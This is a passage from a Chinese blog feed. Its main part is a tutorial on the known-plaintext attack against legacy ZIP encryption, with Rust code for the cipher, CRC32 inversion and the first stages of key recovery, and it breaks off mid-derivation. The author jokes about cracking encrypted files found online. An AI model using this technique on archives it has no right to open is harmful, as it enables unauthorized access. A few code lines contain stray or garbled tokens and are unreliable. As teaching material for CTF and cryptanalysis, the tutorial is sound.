- 轮胎牵引面积 / 轮胎总面积</li><li>重量惩罚: 无牵引比例 * 车辆总质量(kg)</li><li>越野系数: 轮胎牵引面积 / 重量惩罚, 最高不超过 1.0, 最低不低于 0.1</li></ol><p>简化一下: (轮胎总面积 * 轮胎平均越野系数) / ( (1 - 轮胎平均越野系数) * 车辆总质量 )</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;是幸存者笔记，绝不是开发者笔记&lt;/p&gt;
    
    </summary>
    
    
      <category term="game" scheme="https://www.aloxaf.com/categories/game/"/>
    
    
      <category term="cdda" scheme="https://www.aloxaf.com/tags/cdda/"/>
    
  </entry>
  
  <entry>
    <title>ZIP 明文攻击原理（上）</title>
    <link href="https://www.aloxaf.com/2019/04/zip_plaintext_attack/"/>
    <id>https://www.aloxaf.com/2019/04/zip_plaintext_attack/</id>
    <published>2019-04-13T06:39:02.000Z</published>
    <updated>2019-10-14T02:01:25.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>不会有下了</p></blockquote><a id="more"></a><h1 id="前言"><a class="headerlink" href="#前言"></a>前言</h1><p>ZIP 的明文攻击可以说是我在 CTF 里学到的最有用的玩意儿之一了。然而比较残念的是这玩意儿竟然是 CTF 里少有的既常用又不知道原理的玩意儿。。。</p><p>这怎么能忍呢？这么有用的东西竟然没人分析！利用明文攻击从网络上破解一下加密资源（嘿嘿嘿），不比 RSA 那堆实际生活中根本用不上的攻击算法有用多了吗！</p><p>于是我就打算再次（划掉）研究一下 ZIP 的明文攻击。这么有趣的东西怎么可以不知道原理呢！而且知道原理以后还可以魔改出题（大雾</p><h1 id="zip-明文攻击简介"><a class="headerlink" href="#zip-明文攻击简介"></a>ZIP 明文攻击简介</h1><p>明文攻击，顾名思义是知道明文的攻击（</p><p>简单地来讲，就是当我们知道一个加密压缩包内某个文件的内容的时候，我们就可以利用明文攻击迅速有效找出 keys（可以理解为 password 的内部表示形式），从而破解这个压缩包。（password 不一定能成功还原，不过解压文件有 keys 就够了</p><p>在 CTF 中常见的玩法是给一个 xxx.jpg 和一个 xxx.zip，然后查看 xxx.zip 发现里面也有 xxx.jpg，和一个 flag.txt——暗示地非常明显的明文攻击题目。</p><p>比较高级一点的，可能会利用某些文件头之类的来当做明文，比如 XML 文件开头很可能是 <code>&lt;?xml version=&quot;1.0&quot;</code></p><h1 id="前置知识"><a class="headerlink" href="#前置知识"></a>前置知识</h1><h2 id="rust-简介"><a class="headerlink" href="#rust-简介"></a>Rust 简介</h2><p>本文主要使用 Rust 描述算法。</p><p>原因当然是因为我喜欢 Rust （划掉</p><p>原因是我们需要斯必得（speed），所以肯定不能用 Python（用 Python 还不如用 JS 。。。<br>C 语言虽然有斯必得，但是 C 语言。。。你可以看看 pkcrack 的源码，再对比一下 bkcrack 的源码。。。 pkcrack 也就注释多一点这点比较强了</p><p>C++ 虽然也有斯必得，但是我不会 C++ （理直气壮</p><p>所以我就选择了 Rust —— 由 Mozilla 公司创造的伟大语言！虽然学习曲线有点陡峭，但一旦越过写起来就非常 excited。</p><p>Rust 的教程可以参照：<a href="https://kaisery.github.io/trpl-zh-cn/foreword.html" target="_blank" rel="noopener">Rust 程序设计语言</a> （不过只是读代码的话感觉不看应该也读得懂，比如我看 bkcrack 的源码的时候就完全不懂 C++</p><h2 id="zip-传统加密算法"><a class="headerlink" href="#zip-传统加密算法"></a>ZIP 传统加密算法</h2><p>要想研究 ZIP 的明文攻击，我们首先得熟悉 ZIP 的传统加密算法（这里强调“传统”，是因为这么不可靠的加密算法其实早就有替代方案了。当然很多压缩软件为兼容性考虑默认还是使用传统加密算法，这就给了我们可乘之机（讲得自己跟犯罪分子一样（</p><p>ZIP 的传统加密，本质上也是异或加密。当然，不是用 password 异或，而是用一个伪随机数流来和明文进行异或。而产生这个伪随机数流，需要用到三个 keys，下文分别以 x，y，z 代指。这三个 keys 非常重要，加密解密过程实质上只需要这三个 keys，密码的作用其实是初始化这三个 keys。</p><p>简要介绍一下加密流程：在加密前，首先会用密码作为种子初始化这个伪随机数流，然后每加密一个 byte，都会用这个 byte 作为输入产生下一个伪随机数（这个随机数称为 k ）。</p><p>解密过程也是差不多的，首先初始化伪随机数流，然后每解密一个 byte，都用解密后的 byte 作为输入产生下一个伪随机数。</p><p>这个算法非常简单，我们可以直接看代码</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// 贯穿加密算法的三个 keys</span></span><br><span class="line"><span class="comment">/// 加密/解密每个数据块时都会初始化一次 keys</span></span><br><span class="line"><span class="comment">/// 拿到 keys 不一定能还原出密码，但已经足够进行加密/解密了</span></span><br><span class="line"><span class="keyword">pub</span> <span class="class"><span class="keyword">struct</span> <span class="title">Keys</span></span> &#123;</span><br><span class="line">    x: <span class="built_in">u32</span>,</span><br><span class="line">    y: <span class="built_in">u32</span>,</span><br><span class="line">    z: <span class="built_in">u32</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> Keys &#123;</span><br><span class="line">    <span class="comment">/// 使用密码初始化 keys</span></span><br><span class="line">    <span class="keyword">pub</span> <span class="function"><span class="keyword">fn</span> <span class="title">new</span></span>(password: &amp;[<span class="built_in">u8</span>]) -&gt; <span class="keyword">Self</span> &#123;</span><br><span class="line">        <span class="comment">// 首先，使用三个魔术常量初始化 Keys</span></span><br><span class="line">        <span class="comment">// （这常量真随便</span></span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> keys = <span class="keyword">Self</span> &#123;</span><br><span class="line">            x: <span class="number">0x1234_5678</span>,</span><br><span class="line">            y: <span class="number">0x2345_6789</span>,</span><br><span class="line">            z: <span class="number">0x3456_7890</span>,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 然后，获取密码的字节形式，并用它们更新 Keys</span></span><br><span class="line">        <span class="keyword">for</span> &amp;c <span class="keyword">in</span> password &#123;</span><br><span class="line">            keys.update_keys(c);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        keys</span><br><span class="line">        <span class="comment">// 准备工作就绪了，接下来可以用 keys 来加密//解密文件了</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// 加密算法最核心的部分 （超短</span></span><br><span class="line">    <span class="comment">/// 在加密/解密过程中， 这个函数会被不断调用，以更新 keys</span></span><br><span class="line">    <span class="function"><span class="keyword">fn</span> <span class="title">update_keys</span></span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>, c: <span class="built_in">u8</span>) &#123;</span><br><span class="line">        <span class="keyword">self</span>.x = crc32(<span class="keyword">self</span>.x, c);</span><br><span class="line">        <span class="comment">// .wrapping_xxx(), 即允许溢出的运算</span></span><br><span class="line">        <span class="comment">// 虽然 release 模式下默认不检查溢出，但这样写显得严谨</span></span><br><span class="line">        <span class="keyword">self</span>.y = (<span class="keyword">self</span>.y + <span class="built_in">u32</span>::from(lsb(<span class="keyword">self</span>.x))).wrapping_mul(<span class="number">0x0808_8405</span>).wrapping_add(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">self</span>.z = crc32(<span class="keyword">self</span>.z, msb(<span class="keyword">self</span>.y));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// 对外提供的解密函数</span></span><br><span class="line">    <span class="keyword">pub</span> <span class="function"><span class="keyword">fn</span> <span class="title">decrypt</span></span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>, data: &amp;<span class="keyword">mut</span> [<span class="built_in">u8</span>]) &#123;</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> data.iter_mut() &#123;</span><br><span class="line">            <span class="keyword">let</span> p = *c ^ <span class="keyword">self</span>.get_k();</span><br><span class="line">            <span class="keyword">self</span>.update_keys(p);</span><br><span class="line">            *c = p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// 不知道这函数该叫啥。。。功能是从 keys 中计算出一个用来加密/解密的 byte</span></span><br><span class="line">    <span class="comment">/// 是个实际操作中可以打表的函数</span></span><br><span class="line">    <span class="function"><span class="keyword">fn</span> <span class="title">get_k</span></span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>) -&gt; <span class="built_in">u8</span> &#123;</span><br><span class="line">        <span class="comment">// 标准中这里是 `| 2`， 其实效果都一样，毕竟 `2 ^ 1 == 3`, `3 ^ 1 == 2`</span></span><br><span class="line">        <span class="comment">// 不过写成 `| 3` 有助于后续结论的推导</span></span><br><span class="line">        <span class="keyword">let</span> temp = (<span class="keyword">self</span>.z | <span class="number">3</span>) <span class="keyword">as</span> <span class="built_in">u16</span>;</span><br><span class="line">        lsb(((temp * (temp ^ <span class="number">1</span>)) &gt;&gt; <span class="number">8</span>).into())</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// 对外提供的加密函数</span></span><br><span class="line">    <span class="keyword">pub</span> <span class="function"><span class="keyword">fn</span> <span class="title">encrypt</span></span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>, data: &amp;<span class="keyword">mut</span> [<span class="built_in">u8</span>]) &#123;</span><br><span class="line">        <span class="comment">// 和解密过程基本一样(毕竟异或</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> data.iter_mut() &#123;</span><br><span class="line">            <span class="keyword">let</span> c = *p ^ <span class="keyword">self</span>.get_k();</span><br><span class="line">            <span class="keyword">self</span>.update_keys(*p);</span><br><span class="line">            *p = c;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// 朴实的 CRC32 函数，实际操作中一般都会打表</span></span><br><span class="line"><span class="comment">/// 其中 0xEDB8_8320 是 ZIP 标准规定魔术常量</span></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">crc32</span></span>(old_crc: <span class="built_in">u32</span>, c: <span class="built_in">u8</span>) -&gt; <span class="built_in">u32</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> crc = old_crc ^ c <span class="keyword">as</span> <span class="built_in">u32</span>;</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="number">0</span>..<span class="number">8</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> crc % <span class="number">2</span> != <span class="number">0</span> &#123;</span><br><span class="line">        crc = crc &gt;&gt; <span class="number">1</span> ^ <span class="number">0xEDB8_8320</span>;    </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            crc = crc &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    crc</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// 朴实的 lsb 函数，注意是最低有效字节，不是最低有效位</span></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">lsb</span></span>(x: <span class="built_in">u32</span>) -&gt; <span class="built_in">u8</span> &#123;</span><br><span class="line">    x <span class="keyword">as</span> <span class="built_in">u8</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// 朴实的 msb 函数，注意是最高有效字节，不是最高有效位</span></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">msb</span></span>(x: <span class="built_in">u32</span>) -&gt; <span class="built_in">u8</span> &#123;</span><br><span class="line">    (x &gt;&gt; <span class="number">24</span>) <span class="keyword">as</span> <span class="built_in">u8</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 展示一下用法</span></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> keys = Keys::new(<span class="string">"123456"</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> data = <span class="string">b"Illyasviel von Einzbern"</span>.bytes().collect::&lt;<span class="built_in">Vec</span>&lt;_&gt;&gt;();</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"加密前:\n&#123;:?&#125;\n&#123;&#125;"</span>, data, <span class="built_in">String</span>::from_utf8_lossy(&amp;data));</span><br><span class="line">    </span><br><span class="line">    keys.encrypt(&amp;<span class="keyword">mut</span> data);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"加密后:\n&#123;:?&#125;\n&#123;&#125;"</span>, data, <span class="built_in">String</span>::from_utf8_lossy(&amp;data));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 注意要重新初始化 Keys</span></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> keys = Keys::new(<span class="string">"123456"</span>);</span><br><span class="line">    keys.decrypt(&amp;<span class="keyword">mut</span> data);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"解密后:\n&#123;:?&#125;\n&#123;&#125;"</span>, data, <span class="built_in">String</span>::from_utf8_lossy(&amp;data));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>非常简洁易懂的加密对吧，好了进入下一节</p><h2 id="crc32-的查表法与逆"><a class="headerlink" href="#crc32-的查表法与逆"></a>CRC32 的查表法与逆</h2><p>这个其实没什么好讲的，主要就是如何用查表优化 CRC32 的计算以及逆 CRC32</p><p>这类文章网上一抓一大把，这里只给结论了（其实是我不知道原理<br>$$<br>\mathrm { crc32 = crc32(pval, char) = (pval \gg 8) \oplus crctab[LSB(pval) \oplus char] } \\<br>\mathrm { pval = crc32^{-1}(crc32, char) = (crc32 \ll 8) \oplus crcinvtab[MSB(crc32)] \oplus char }<br>$$<br>而 crctab 和 crcinvtab 的生成算法见下面的代码</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">lazy_static! &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">ref</span> CRCTAB: [<span class="built_in">u32</span>; <span class="number">256</span>] = init_crctab();</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">ref</span> CRCINVTAB: [<span class="built_in">u32</span>; <span class="number">256</span>] = init_crcinvtab();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// 利用查表计算 crc32</span></span><br><span class="line"><span class="keyword">pub</span> <span class="function"><span class="keyword">fn</span> <span class="title">crc32</span></span>(old_crc: <span class="built_in">u32</span>, b: <span class="built_in">u8</span>) -&gt; <span class="built_in">u32</span> &#123;</span><br><span class="line">    (old_crc &gt;&gt; <span class="number">8</span>) ^ CRCTAB[(lsb(old_crc) ^ b) <span class="keyword">as</span> <span class="built_in">usize</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// 利用查表逆 crc32</span></span><br><span class="line"><span class="comment">/// ```a</span></span><br><span class="line"><span class="comment">/// use tmp::crc32::*;</span></span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="comment">/// let crc = crc32(0xdeadbeef, 0x10);</span></span><br><span class="line"><span class="comment">/// let crcinv = crc32inv(crc, 0x10);</span></span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="comment">/// assert_eq!(crcinv, 0xdeadbeef)</span></span><br><span class="line"><span class="comment">/// ```a</span></span><br><span class="line"><span class="keyword">pub</span> <span class="function"><span class="keyword">fn</span> <span class="title">crc32inv</span></span>(crc: <span class="built_in">u32</span>, b: <span class="built_in">u8</span>) -&gt; <span class="built_in">u32</span> &#123;</span><br><span class="line">    (crc &lt;&lt; <span class="number">8</span>) ^ CRCINVTAB[msb(crc) <span class="keyword">as</span> <span class="built_in">usize</span>] ^ b <span class="keyword">as</span> <span class="built_in">u32</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// 刚正朴实的 crc32 算法</span></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">crc32_func</span></span>(old_crc: <span class="built_in">u32</span>, b: <span class="built_in">u8</span>) -&gt; <span class="built_in">u32</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> crc = old_crc ^ b <span class="keyword">as</span> <span class="built_in">u32</span>;</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="number">0</span>..<span class="number">8</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> crc % <span class="number">2</span> == <span class="number">1</span> &#123;</span><br><span class="line">            crc = crc &gt;&gt; <span class="number">1</span> ^ <span class="number">0xEDB8_8320</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            crc = crc &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    crc</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// 初始化 crc32 表</span></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">init_crctab</span></span>() -&gt; [<span class="built_in">u32</span>; <span class="number">256</span>] &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> crctab = [<span class="number">0</span>; <span class="number">256</span>];</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">0</span>..=<span class="number">255</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> crc = crc32_func(<span class="number">0</span>, i);</span><br><span class="line">        crctab[i <span class="keyword">as</span> <span class="built_in">usize</span>] = crc;</span><br><span class="line">    &#125;</span><br><span class="line">    crctab</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// 初始化逆 crc32 表</span></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">init_crcinvtab</span></span>() -&gt; [<span class="built_in">u32</span>; <span class="number">256</span>] &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> crcinvtab = [<span class="number">0</span>; <span class="number">256</span>];</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">0</span>..=<span class="number">255</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> crc = crc32_func(<span class="number">0</span>, i);</span><br><span class="line">        crcinvtab[(crc &gt;&gt; <span class="number">24</span>) <span class="keyword">as</span> <span class="built_in">usize</span>] = (crc &lt;&lt; <span class="number">8</span>) ^ i <span class="keyword">as</span> <span class="built_in">u32</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    crcinvtab</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="明文攻击"><a class="headerlink" href="#明文攻击"></a>明文攻击</h1><h2 id="step1-生成-k-列表"><a class="headerlink" href="#step1-生成-k-列表"></a>step1 - 生成 K 列表</h2><p>首先，称 <code>get_k()</code> 函数的返回值，也就是那个用来加解密的伪随机数为 <code>k</code></p><p>然后，现在我们已经拿到了明文和密文。显然，将明文和密文异或，我们就可以得到 k 的序列。这应该是显而易见的，毕竟 <code>k ^ plain_byte = cipher_byte</code>，那么由异或的性质我们就可以推出 <code>cipher_byte ^ plain_byte = k</code></p><h2 id="step2-从-k-到-z"><a class="headerlink" href="#step2-从-k-到-z"></a>step2 - 从 K 到 Z</h2><p>拿到了 k，接下来就轮到 z 了。</p><p>观察 k 的生成代码</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> temp = (<span class="keyword">self</span>.z | <span class="number">3</span>) <span class="keyword">as</span> <span class="built_in">u16</span>;</span><br><span class="line">lsb(((temp * (temp ^ <span class="number">1</span>)) &gt;&gt; <span class="number">8</span>).into()) <span class="comment">// k: u8</span></span><br></pre></td></tr></table></figure><p>可以发现 k 是由 temp 计算得到的，而 temp 是由 z 计算得到的。真是 excited，竟然只有 z 一个未知量。</p><p>那么如何用 k 推出 z 呢？当然是推不出的，我们只能推出一个大概的范围。</p><p>冷静分析一下，注意到 <code>(self.z | 3)</code> 这个操作，使得 temp 最低两位始终为 1，消除了 <code>z</code> 的 2 个最低有效位的影响；<br>而 temp 是 <code>u16</code> 类型的，消除了 <code>z</code> 的16个最高有效位的影响。于是 temp 的值仅仅取决于 <code>z</code> 的 [2, 16) 位，共计 14 位。为了方便接下来的讨论，我们将这 14 位命名为 bits1。</p><p>bits1 只有 14 位，那显然 temp 的值就一共只有 $2^{14}$ 种可能性。而 k 作为一个 u8 类型的变量，它的值只有 $2^8$ 种可能性。<br>也就说是，平均起来对于每一个确定的 k，存在 $2^{14} \div 2^8 = 2^6 = 64$ 个 temp 与之对应，同理，也只有 64 个 bits1 与之对应 。当然这只是统计学意义上的推断，不能当做证明。</p><p>接下来我们来证明一下</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="keyword">mut</span> map = HashMap::new();</span><br><span class="line"></span><br><span class="line"><span class="comment">// temp 的值只取决于 z 的 14 位</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="number">0</span>..(<span class="number">1</span> &lt;&lt; <span class="number">14</span>) &#123;hbxrvi</span><br><span class="line">    <span class="keyword">let</span> temp = (n &lt;&lt; <span class="number">2</span>) | <span class="number">3</span> <span class="keyword">as</span> <span class="built_in">u16</span>;</span><br><span class="line">    <span class="keyword">let</span> k = lsb((temp * (temp ^ <span class="number">1</span>)) &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    map.entry(k).or_insert(<span class="built_in">vec!</span>[]).push(temp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 验证是否对于每个 k 有且只有 64 个 temp 的可能值与之对应</span></span><br><span class="line"><span class="built_in">assert_eq!</span>(map.len(), <span class="number">256</span>);</span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> map.values() &#123;</span><br><span class="line">    <span class="built_in">assert_eq!</span>(v.len(), <span class="number">64</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行一下这个程序，没有报错。说明是对的，证明完毕（你们可能会觉得这个证明很扯，但是我觉得我已经很贴心了—— 论文中 TM 提都没提这个结论是怎么来的（当然应该有数学意义上的证明不过懒得推了（其实是不会</p><p>也就是说，给定一个 k，我们能推出 $2^{6} $个可能的 temp, 对应的可以推出 $2^{16}$ 个可能的 bits1。再加上 z 的未知的 16 个最高有效位，我们通过一个 k 可以推出 $2^6 \times 2^{16}  = 2^{22} $ 个可能的 z 的 <strong>30 个最高有效位</strong> 的值。</p><p>列一下代码</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 算出所有 k 的值</span></span><br><span class="line"><span class="keyword">let</span> k_list = plain_text</span><br><span class="line">    .iter()</span><br><span class="line">    .zip(cipher_text.iter())</span><br><span class="line">    .map(|(a, b)| a ^ b)</span><br><span class="line">    .collect::&lt;<span class="built_in">Vec</span>&lt;<span class="built_in">u8</span>&gt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="comment">// step1 -- 生成所有 z 的可能值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// z 的 [2, 32) 位的可能值，2^22 个</span></span><br><span class="line"><span class="keyword">let</span> <span class="keyword">mut</span> z_2_32_tab = <span class="built_in">Vec</span>::with_capacity(<span class="number">1</span> &lt;&lt; <span class="number">22</span>);</span><br><span class="line"><span class="comment">// 获取 64 个 z [2, 16) 位的可能的值</span></span><br><span class="line"><span class="keyword">for</span> &amp;z_2_16 <span class="keyword">in</span> kinv(*k_list.last().unwrap()).iter() &#123;</span><br><span class="line">    <span class="comment">// 穷举  16 个最高有效位  的值</span></span><br><span class="line">    <span class="keyword">for</span> z_16_32 <span class="keyword">in</span> <span class="number">0</span>..(<span class="number">1</span> &lt;&lt; <span class="number">16</span>) &#123;</span><br><span class="line">        <span class="comment">// 按位或， 得到 z [2, 32) 位的可能值</span></span><br><span class="line">        z_2_32_tab.push(z_2_16 | z_16_32 &lt;&lt; <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$2^{22}$ 个可能的值，有点多啊。。。这还只是 z 呢。。。</p><h2 id="step3-缩小-z-范围"><a class="headerlink" href="#step3-缩小-z-范围"></a>step3 - 缩小 Z 范围</h2><p>这么多 z 完全没法玩，因为利用一个确定 z 进行一次攻击的复杂度是 $2^{16}$（后文会提到）, 不优化一下的话整个攻击的复杂度就到了 $2^{22} \times 2^{16} = 2^{38}$，完全没法做下去了。</p><p>不要慌，我们这还只用了一个已知明文 byte，而进行攻击只需要 12~13 个 bytes（同样后文会提到）<br>我们可以用剩下的 bytes 来想办法减少 z 的候选值。</p><p>观察一下 z 的更新代码，发现这里比较麻烦，有两个变量——上一轮的 z 和这一轮的 key1</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">self</span>.z = crc32(<span class="keyword">self</span>.keyzsb(<span class="keyword">self</span>.key1));</span><br></pre></td></tr></table></figure><p>为了直观一点我们写成如下形式，i 表示第 i 轮<br>$$<br>\mathrm { Z_{i+1} = crc32(Z_i,MSB(Y_{i+1})) }<br>$$<br>借用前置知识里关于 crc32 的结论，这个表达式可以改写为<br>$$<br>\begin{align}<br>\mathrm {Z_i} &amp; = \mathrm {crc32^{-1}(Z_{i+1}, MSB(Y_{i+1}))} \\<br>&amp; = \mathrm { (Z_{i+1} \ll 8) \oplus crcinvtab[MSB(Z_{i+1})] \oplus MSB(Y_{i+1}) 